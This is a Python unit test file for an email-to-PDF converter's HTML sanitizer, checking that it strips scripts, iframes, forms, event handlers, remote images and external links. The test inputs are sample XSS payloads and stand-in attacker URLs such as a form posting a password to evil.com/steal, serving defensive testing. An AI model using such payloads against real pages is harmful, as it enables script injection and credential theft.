"""Unit tests for HTML sanitization security functions."""
import unittest
from eml2pdf.security import sanitize_html


class TestSanitizeHtml(unittest.TestCase):
    """Test HTML sanitization for security vulnerabilities."""

    def test_removes_script_tags(self):
        """Script tags should be completely removed."""
        html = '<p>Safe content</p><script>alert("XSS")</script><p>More safe</p>'
        result = sanitize_html(html)
        self.assertNotIn('<script>', result)
        self.assertNotIn('alert', result)
        self.assertIn('<p>Safe content</p>', result)
        self.assertIn('<p>More safe</p>', result)

    def test_removes_iframe_tags(self):
        """Iframe tags should be completely removed."""
        html = '<div>Content</div><iframe src="http://evil.com"></iframe>'
        result = sanitize_html(html)
        self.assertNotIn('<iframe', result)
        self.assertNotIn('evil.com', result)

    def test_removes_object_tags(self):
        """Object tags should be completely removed."""
        html = '<p>Text</p><object data="malicious.swf"></object>'
        result = sanitize_html(html)
        self.assertNotIn('<object', result)
        self.assertNotIn('malicious.swf', result)

    def test_removes_embed_tags(self):
        """Embed tags should be completely removed."""
        html = '<embed src="evil.swf" type="application/x-shockwave-flash">'
        result = sanitize_html(html)
        self.assertNotIn('<embed', result)

    def test_removes_video_tags(self):
        """Video tags should be completely removed."""
        html = '<video src="http://tracker.com/video.mp4"></video>'
        result = sanitize_html(html)
        self.assertNotIn('<video', result)

    def test_removes_audio_tags(self):
        """Audio tags should be completely removed."""
        html = '<audio src="http://tracker.com/audio.mp3"></audio>'
        result = sanitize_html(html)
        self.assertNotIn('<audio', result)

    def test_removes_form_tags(self):
        """Form tags should be completely removed."""
        html = '<form action="http://evil.com/steal"><input name="data"></form>'
        result = sanitize_html(html)
        self.assertNotIn('<form', result)
        self.assertNotIn('evil.com', result)

    def test_removes_meta_tags(self):
        """Meta tags should be completely removed."""
        html = '<meta http-equiv="refresh" content="0;url=http://evil.com">'
        result = sanitize_html(html)
        self.assertNotIn('<meta', result)

    def test_removes_link_tags(self):
        """Link tags should be completely removed."""
        html = '<link rel="stylesheet" href="http://evil.com/style.css">'
        result = sanitize_html(html)
        self.assertNotIn('<link', result)

    def test_removes_remote_http_images(self):
        """Images with http:// URLs should be removed."""
        html = '<img src="http://tracker.com/pixel.gif" alt="Tracking pixel">'
        result = sanitize_html(html)
        self.assertNotIn('tracker.com', result)
        self.assertNotIn('<img', result)

    def test_removes_remote_https_images(self):
        """Images with https:// URLs should be removed."""
        html = '<img src="https://tracker.com/pixel.gif">'
        result = sanitize_html(html)
        self.assertNotIn('tracker.com', result)
        self.assertNotIn('<img', result)

    def test_preserves_data_uri_images(self):
        """Images with data: URIs should be preserved."""
        html = '<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">'
        result = sanitize_html(html)
        self.assertIn('data:image', result)
        self.assertIn('<img', result)

    def test_preserves_cid_images(self):
        """Images with cid: references should be preserved (email attachments)."""
        html = '<img src="cid:image001.jpg@01DA1234">'
        result = sanitize_html(html)
        self.assertIn('cid:', result)
        self.assertIn('<img', result)

    def test_sanitizes_style_with_url(self):
        """Style attributes containing url() should be cleared."""
        html = '<div style="background: url(http://tracker.com/bg.png)">Content</div>'
        result = sanitize_html(html)
        self.assertNotIn('tracker.com', result)
        self.assertIn('style=""', result)

    def test_preserves_style_without_url(self):
        """Style attributes without url() should be preserved."""
        html = '<div style="color: red; font-weight: bold;">Content</div>'
        result = sanitize_html(html)
        self.assertIn('color: red', result)
        self.assertIn('font-weight: bold', result)

    def test_neutralizes_external_http_links(self):
        """External http:// links should have href replaced with #."""
        html = '<a href="http://evil.com/malware">Click here</a>'
        result = sanitize_html(html)
        self.assertIn('href="#"', result)
        self.assertNotIn('evil.com', result)
        self.assertIn('Click here', result)  # Text should remain

    def test_neutralizes_external_https_links(self):
        """External https:// links should have href replaced with #."""
        html = '<a href="https://evil.com">Link</a>'
        result = sanitize_html(html)
        self.assertIn('href="#"', result)

    def test_preserves_internal_links(self):
        """Internal anchor links should be preserved."""
        html = '<a href="#section1">Go to section</a>'
        result = sanitize_html(html)
        self.assertIn('href="#section1"', result)

    def test_removes_onclick_handler(self):
        """onclick event handlers should be removed."""
        html = '<button onclick="alert(\'XSS\')">Click</button>'
        result = sanitize_html(html)
        self.assertNotIn('onclick', result)
        self.assertIn('<button>', result)

    def test_removes_onload_handler(self):
        """onload event handlers should be removed."""
        html = '<body onload="stealData()">Content</body>'
        result = sanitize_html(html)
        self.assertNotIn('onload', result)

    def test_removes_onerror_handler(self):
        """onerror event handlers should be removed."""
        html = '<img src="x" onerror="alert(1)">'
        result = sanitize_html(html)
        self.assertNotIn('onerror', result)

    def test_removes_onmouseover_handler(self):
        """onmouseover event handlers should be removed."""
        html = '<div onmouseover="trackUser()">Hover me</div>'
        result = sanitize_html(html)
        self.assertNotIn('onmouseover', result)

    def test_removes_data_attributes(self):
        """Custom data-* attributes should be removed."""
        html = '<div data-tracking-id="12345" data-user="john">Content</div>'
        result = sanitize_html(html)
        self.assertNotIn('data-tracking-id', result)
        self.assertNotIn('data-user', result)

    def test_complex_attack_scenario(self):
        """Test a complex multi-vector attack is fully sanitized."""
        html = '''
        <div onclick="steal()" data-evil="payload">
            <script>alert('XSS')</script>
            <img src="http://tracker.com/pixel.gif">
            <iframe src="http://evil.com"></iframe>
            <a href="http://phishing.com">Click here</a>
            <form action="http://evil.com/steal">
                <input name="password">
            </form>
        </div>
        '''
        result = sanitize_html(html)

        # Verify all dangerous elements are removed or neutralized
        self.assertNotIn('<script>', result)
        self.assertNotIn('alert', result)
        self.assertNotIn('tracker.com', result)
        self.assertNotIn('<iframe', result)
        self.assertNotIn('evil.com', result)
        self.assertNotIn('phishing.com', result)
        self.assertNotIn('<form', result)
        self.assertNotIn('onclick', result)
        self.assertNotIn('data-evil', result)

        # Link should be neutralized
        self.assertIn('href="#"', result)

    def test_empty_string(self):
        """Empty string input should return empty result."""
        result = sanitize_html('')
        self.assertEqual(result, '')

    def test_plain_text_only(self):
        """Plain text without HTML should pass through safely."""
        html = 'Just plain text with no tags'
        result = sanitize_html(html)
        self.assertIn('Just plain text with no tags', result)

    def test_safe_html_preserved(self):
        """Safe, common HTML elements should be preserved."""
        html = '''
        <html>
            <body>
                <h1>Title</h1>
                <p>Paragraph with <strong>bold</strong> and <em>italic</em>.</p>
                <ul>
                    <li>Item 1</li>
                    <li>Item 2</li>
                </ul>
            </body>
        </html>
        '''
        result = sanitize_html(html)
        self.assertIn('<h1>Title</h1>', result)
        self.assertIn('<strong>bold</strong>', result)
        self.assertIn('<em>italic</em>', result)
        self.assertIn('<ul>', result)
        self.assertIn('<li>Item 1</li>', result)
